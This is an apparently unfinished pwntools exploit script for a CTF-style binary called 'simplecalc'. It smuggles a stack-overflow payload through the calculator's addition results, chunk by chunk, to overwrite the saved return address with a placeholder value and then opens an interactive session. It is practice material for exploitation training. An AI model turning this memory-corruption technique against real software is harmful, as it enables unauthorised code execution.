#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './simplecalc'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x0401551
b *0x00401474
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# 0x000000000115abf0

#payload = cyclic(72)
payload = cyclic(48)
payload += p64(0) # free(0) is ok
payload += cyclic(16)
payload += p64(0x0123456789abcdef) # rbp+0x8

io = start()

print(io.recvuntil(b'calculations: '))

io.send(str(len(payload)) + '\n')

print(io.recvuntil(b'=> '))

chunks = [payload[i:i+4] for i in range(0, len(payload), 4)]

for chunk in chunks:
    asInt = int(binascii.hexlify(chunk), 16)
    asInt = struct.unpack("<I", struct.pack(">I", asInt))[0]
    if (asInt == 0):
        io.send(str(2) + '\n')
        op1 = 1431655765
        op2 = 1431655765 #0x55555555
    else:
        io.send(str(1) + '\n')
        op1 = math.floor(asInt/2)
        op2 = asInt - op1

    print(io.recvuntil(b'x: '))
    io.send(str(op1) + '\n')
    print(io.recvuntil(b'y: '))
    io.send(str(op2) + '\n')
    print(io.recvuntil(b'=> '))

io.send(str(5) + '\n')

io.interactive()

